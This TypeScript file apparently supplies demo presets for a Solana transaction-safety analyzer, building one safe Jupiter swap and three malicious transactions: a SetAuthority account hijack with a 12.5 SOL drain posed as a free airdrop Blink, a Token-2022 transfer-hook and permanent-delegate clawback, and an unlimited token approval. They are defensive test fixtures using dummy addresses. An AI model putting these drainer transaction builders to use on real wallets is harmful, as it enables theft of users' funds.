import {
  PublicKey,
  Transaction,
  TransactionInstruction,
  SystemProgram,
} from "@solana/web3.js";
import {
  DeterministicSimulationReport,
  analyzeBase64Transaction,
} from "./solana-parser";

export interface SimulationPreset {
  id: string;
  name: string;
  subtitle: string;
  badge: "SAFE" | "WARNING" | "CRITICAL";
  blinkActionUrl: string;
  base64Transaction: string;
  simulatedBalanceDeltas: {
    asset: string;
    mint: string;
    deltaUiAmount: number;
    direction: "IN" | "OUT";
    isToken2022?: boolean;
  }[];
  contextNotes: string;
}

const DUMMY_WALLET = new PublicKey(
  "9xQeWvG816bUx9EPjHmaT23yvVM2ZWbrrpZb9PusVFin"
);
const DUMMY_ATTACKER = new PublicKey(
  "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB"
);
const DUMMY_HOOK_PROGRAM = new PublicKey(
  "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263"
);
const SPL_TOKEN_PROGRAM = new PublicKey(
  "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
);
const TOKEN_2022_PROGRAM = new PublicKey(
  "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
);
const JUPITER_V6_PROGRAM = new PublicKey(
  "JUP6LkbZbjS1jKKwapdHNy74zcZ3tLUZoi5QNyVTaV4"
);
const COMPUTE_BUDGET_PROGRAM = new PublicKey(
  "ComputeBudget111111111111111111111111111111"
);
const SOLSHIELD_POLICY_PROGRAM = new PublicKey(
  "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS"
);
const RECENT_BLOCKHASH = "11111111111111111111111111111111";

function buildSafeJupiterSwapBase64(): string {
  const tx = new Transaction({
    feePayer: DUMMY_WALLET,
    recentBlockhash: RECENT_BLOCKHASH,
  });

  // 1. ComputeBudget priority fee instruction
  tx.add(
    new TransactionInstruction({
      programId: COMPUTE_BUDGET_PROGRAM,
      keys: [],
      data: Buffer.from([3, 16, 39, 0, 0, 0, 0, 0, 0]),
    })
  );

  // 2. SolShield Policy Guard verification CPI
  tx.add(
    new TransactionInstruction({
      programId: SOLSHIELD_POLICY_PROGRAM,
      keys: [
        { pubkey: DUMMY_WALLET, isSigner: true, isWritable: false },
        { pubkey: SOLSHIELD_POLICY_PROGRAM, isSigner: false, isWritable: true },
      ],
      data: Buffer.from([1, 0, 200, 10]),
    })
  );

  // 3. Jupiter v6 SharedAccountsRoute instruction
  tx.add(
    new TransactionInstruction({
      programId: JUPITER_V6_PROGRAM,
      keys: [
        { pubkey: DUMMY_WALLET, isSigner: true, isWritable: true },
        { pubkey: SPL_TOKEN_PROGRAM, isSigner: false, isWritable: false },
      ],
      data: Buffer.from([193, 32, 155, 51, 65, 214, 156, 129, 50, 0]),
    })
  );

  return tx
    .serialize({ requireAllSignatures: false, verifySignatures: false })
    .toString("base64");
}

function buildSetAuthorityDrainerBase64(): string {
  const tx = new Transaction({
    feePayer: DUMMY_WALLET,
    recentBlockhash: RECENT_BLOCKHASH,
  });

  // Disguised as a "Free NFT Claim Blink", but contains SPL Token SetAuthority (tag = 6, AccountOwner = 2)
  const setAuthData = Buffer.concat([
    Buffer.from([6, 2, 1]), // Tag 6 = SetAuthority, Type 2 = AccountOwner, Option = Some(1)
    DUMMY_ATTACKER.toBuffer(),
  ]);

  tx.add(
    new TransactionInstruction({
      programId: SPL_TOKEN_PROGRAM,
      keys: [
        { pubkey: DUMMY_WALLET, isSigner: false, isWritable: true }, // User's USDC ATA
        { pubkey: DUMMY_WALLET, isSigner: true, isWritable: false }, // Current Owner Signer
        { pubkey: DUMMY_ATTACKER, isSigner: false, isWritable: false }, // New Owner (Attacker)
      ],
      data: setAuthData,
    })
  );

  // Also drains 12.5 SOL via SystemProgram::Transfer
  tx.add(
    SystemProgram.transfer({
      fromPubkey: DUMMY_WALLET,
      toPubkey: DUMMY_ATTACKER,
      lamports: 12_500_000_000,
    })
  );

  return tx
    .serialize({ requireAllSignatures: false, verifySignatures: false })
    .toString("base64");
}

function buildToken2022MaliciousHookBase64(): string {
  const tx = new Transaction({
    feePayer: DUMMY_WALLET,
    recentBlockhash: RECENT_BLOCKHASH,
  });

  // 1. Token-2022 TransferChecked (tag = 12) invoking an unverified 5th account (TransferHook program)
  tx.add(
    new TransactionInstruction({
      programId: TOKEN_2022_PROGRAM,
      keys: [
        { pubkey: DUMMY_WALLET, isSigner: false, isWritable: true }, // Source
        { pubkey: TOKEN_2022_PROGRAM, isSigner: false, isWritable: false }, // Mint
        { pubkey: DUMMY_ATTACKER, isSigner: false, isWritable: true }, // Destination
        { pubkey: DUMMY_WALLET, isSigner: true, isWritable: false }, // Owner
        { pubkey: DUMMY_HOOK_PROGRAM, isSigner: false, isWritable: false }, // Unverified TransferHook CPI Program!
      ],
      data: Buffer.from([12, 0, 225, 245, 5, 0, 0, 0, 0, 9]),
    })
  );

  // 2. Token-2022 PermanentDelegate instruction (tag = 35)
  tx.add(
    new TransactionInstruction({
      programId: TOKEN_2022_PROGRAM,
      keys: [
        { pubkey: TOKEN_2022_PROGRAM, isSigner: false, isWritable: true },
        { pubkey: DUMMY_ATTACKER, isSigner: false, isWritable: false },
      ],
      data: Buffer.from([35, 1]),
    })
  );

  return tx
    .serialize({ requireAllSignatures: false, verifySignatures: false })
    .toString("base64");
}

function buildUnlimitedApproveBlinkBase64(): string {
  const tx = new Transaction({
    feePayer: DUMMY_WALLET,
    recentBlockhash: RECENT_BLOCKHASH,
  });

  // SPL Token ApproveChecked (tag = 13) granting u64::MAX allowance to an external contract
  tx.add(
    new TransactionInstruction({
      programId: SPL_TOKEN_PROGRAM,
      keys: [
        { pubkey: DUMMY_WALLET, isSigner: false, isWritable: true }, // Token Account
        { pubkey: DUMMY_HOOK_PROGRAM, isSigner: false, isWritable: false }, // Delegate
        { pubkey: DUMMY_WALLET, isSigner: true, isWritable: false }, // Owner Signer
      ],
      data: Buffer.from([13, 255, 255, 255, 255, 255, 255, 255, 255, 6]),
    })
  );

  return tx
    .serialize({ requireAllSignatures: false, verifySignatures: false })
    .toString("base64");
}

export const SIMULATION_PRESETS: SimulationPreset[] = [
  {
    id: "safe-jupiter-swap",
    name: "Safe Jupiter v6 Swap (SOL -> USDC)",
    subtitle: "Verified aggregator route guarded by SolShield Anchor Policy PDA",
    badge: "SAFE",
    blinkActionUrl:
      "solana-action:https://solshield.app/api/actions/audit-swap?inputMint=SOL&outputMint=USDC&amount=1.5",
    base64Transaction: buildSafeJupiterSwapBase64(),
    simulatedBalanceDeltas: [
      {
        asset: "SOL",
        mint: "So11111111111111111111111111111111111111112",
        deltaUiAmount: -1.5,
        direction: "OUT",
      },
      {
        asset: "USDC",
        mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v",
        deltaUiAmount: 279.45,
        direction: "IN",
      },
    ],
    contextNotes:
      "Standard Jupiter v6 swap with ComputeBudget priority fee and SolShield Policy PDA verification.",
  },
  {
    id: "drainer-set-authority",
    name: "Phishing Blink: SPL SetAuthority + SOL Drainer",
    subtitle:
      "Disguised as 'Free Airdrop Claim' Blink — silently hijacks USDC ATA ownership",
    badge: "CRITICAL",
    blinkActionUrl:
      "solana-action:https://claim-bonk-reward-drop.xyz/api/actions/claim",
    base64Transaction: buildSetAuthorityDrainerBase64(),
    simulatedBalanceDeltas: [
      {
        asset: "SOL",
        mint: "So11111111111111111111111111111111111111112",
        deltaUiAmount: -12.5,
        direction: "OUT",
      },
      {
        asset: "USDC (Authority Lost)",
        mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v",
        deltaUiAmount: -4250.0,
        direction: "OUT",
      },
    ],
    contextNotes:
      "Attacker uses SPL Token SetAuthority (AuthorityType::AccountOwner) to permanently seize the user's token account.",
  },
  {
    id: "token2022-malicious-hook",
    name: "Token-2022 Honeypot: Unverified TransferHook + PermanentDelegate",
    subtitle:
      "Token Extensions mint with hidden clawback delegate & custom transfer hook CPI",
    badge: "CRITICAL",
    blinkActionUrl:
      "solana-action:https://solshield.app/api/actions/audit-swap?mint=TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb",
    base64Transaction: buildToken2022MaliciousHookBase64(),
    simulatedBalanceDeltas: [
      {
        asset: "RWA-X (Token-2022)",
        mint: "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb",
        deltaUiAmount: -100.0,
        direction: "OUT",
        isToken2022: true,
      },
    ],
    contextNotes:
      "Uses SPL Token-2022 extensions: invokes an unverified TransferHook program and enables PermanentDelegate clawback.",
  },
  {
    id: "warning-unlimited-approve",
    name: "DeFi Yield Blink: Unlimited Token Delegate Approval",
    subtitle:
      "Requests u64::MAX spending allowance via SPL ApproveChecked to unverified vault",
    badge: "WARNING",
    blinkActionUrl:
      "solana-action:https://yield-farm-booster.io/api/actions/stake-usdc",
    base64Transaction: buildUnlimitedApproveBlinkBase64(),
    simulatedBalanceDeltas: [
      {
        asset: "USDC Allowance (Unlimited)",
        mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v",
        deltaUiAmount: -999999,
        direction: "OUT",
      },
    ],
    contextNotes:
      "Grants persistent token delegate authority to an external address without scoping the allowance amount.",
  },
];

export function getPresetReport(presetId: string): {
  preset: SimulationPreset;
  report: DeterministicSimulationReport;
} {
  const preset =
    SIMULATION_PRESETS.find((p) => p.id === presetId) ?? SIMULATION_PRESETS[0];
  const report = analyzeBase64Transaction(preset.base64Transaction);
  report.sourceType = "PRESET_SCENARIO";
  if (preset.simulatedBalanceDeltas.length > 0) {
    report.balanceDeltas = preset.simulatedBalanceDeltas;
  }
  return { preset, report };
}
